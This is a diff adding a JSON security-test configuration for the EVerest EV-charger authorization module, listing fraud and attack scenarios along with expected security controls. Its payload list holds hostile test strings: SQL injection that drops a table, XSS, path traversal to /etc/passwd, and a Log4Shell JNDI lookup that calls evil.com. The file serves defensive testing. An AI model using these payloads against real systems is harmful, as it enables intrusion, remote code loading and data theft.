@@ -1,0 +1,153 @@
+{
+  "test_configuration": {
+    "description": "EVerest Auth Module Security Test Configuration",
+    "version": "1.0",
+    "test_environments": {
+      "development": {
+        "auth_module": {
+          "connection_timeout": 60,
+          "master_pass_group_id": "MASTER_PASS_2025",
+          "prioritize_authorization_over_stopping_transaction": true,
+          "ignore_connector_faults": false
+        },
+        "evse_setup": {
+          "connector_count": 3,
+          "connector_types": ["Type2", "CCS", "CHAdeMO"]
+        }
+      },
+      "production_simulation": {
+        "auth_module": {
+          "connection_timeout": 30,
+          "master_pass_group_id": "",
+          "prioritize_authorization_over_stopping_transaction": true,
+          "ignore_connector_faults": false
+        },
+        "evse_setup": {
+          "connector_count": 10,
+          "connector_types": ["Type2", "CCS"]
+        }
+      }
+    },
+    "fraud_scenarios": {
+      "free_charging_attacks": {
+        "enabled": true,
+        "tests": [
+          "rfid_cloning",
+          "replay_attack", 
+          "authorization_bypass",
+          "token_injection"
+        ]
+      },
+      "service_disruption": {
+        "enabled": true,
+        "tests": [
+          "connector_exhaustion",
+          "reservation_bombing",
+          "token_flooding"
+        ]
+      },
+      "data_theft": {
+        "enabled": true,
+        "tests": [
+          "token_enumeration",
+          "session_data_extraction"
+        ]
+      },
+      "infrastructure_manipulation": {
+        "enabled": true,
+        "tests": [
+          "master_pass_abuse",
+          "unauthorized_stop"
+        ]
+      },
+      "reservation_fraud": {
+        "enabled": true,
+        "tests": [
+          "reservation_squatting",
+          "fake_reservations"
+        ]
+      },
+      "race_conditions": {
+        "enabled": true,
+        "tests": [
+          "concurrent_authorization",
+          "reservation_race"
+        ]
+      },
+      "input_validation": {
+        "enabled": true,
+        "tests": [
+          "malformed_tokens",
+          "buffer_overflow"
+        ]
+      }
+    },
+    "attack_vectors": {
+      "rfid_attacks": {
+        "cloned_tokens": [
+          "CLONED_USER_12345",
+          "CLONED_ADMIN_999",
+          "CLONED_SERVICE_001"
+        ],
+        "replay_tokens": [
+          "REPLAY_TOKEN_999",
+          "REPEATED_AUTH_TOKEN"
+        ]
+      },
+      "injection_payloads": [
+        "'; DROP TABLE tokens; --",
+        "<script>alert('xss')</script>",
+        "../../etc/passwd",
+        "admin'/**/OR/**/1=1#",
+        "../conf/auth.conf",
+        "${jndi:ldap://evil.com/a}"
+      ],
+      "overflow_payloads": [
+        "A",
+        "AA", 
+        "AAAA"
+      ],
+      "overflow_sizes": [1000, 10000, 100000]
+    },
+    "security_thresholds": {
+      "max_failed_attempts_per_minute": 5,
+      "max_concurrent_sessions_per_token": 1,
+      "max_reservations_per_user": 3,
+      "reservation_max_duration_hours": 24,
+      "token_validation_timeout_seconds": 10
+    },
+    "monitoring": {
+      "log_security_events": true,
+      "alert_on_suspicious_patterns": true,
+      "generate_detailed_reports": true,
+      "audit_master_pass_usage": true
+    }
+  },
+  "expected_security_controls": {
+    "authentication": [
+      "Multi-layer token validation",
+      "Rate limiting on authentication attempts", 
+      "Token replay protection",
+      "Input sanitization and validation"
+    ],
+    "authorization": [
+      "Session binding to tokens",
+      "Reservation-based access control",
+      "Master pass emergency override",
+      "Time-based access restrictions"
+    ],
+    "audit_logging": [
+      "All authentication events",
+      "Failed access attempts",
+      "Master pass usage",
+      "Reservation activities",
+      "Security violations"
+    ],
+    "fault_tolerance": [
+      "Graceful handling of invalid inputs",
+      "Protection against buffer overflows",
+      "Race condition prevention",
+      "State synchronization"
+    ]
+  }
+}
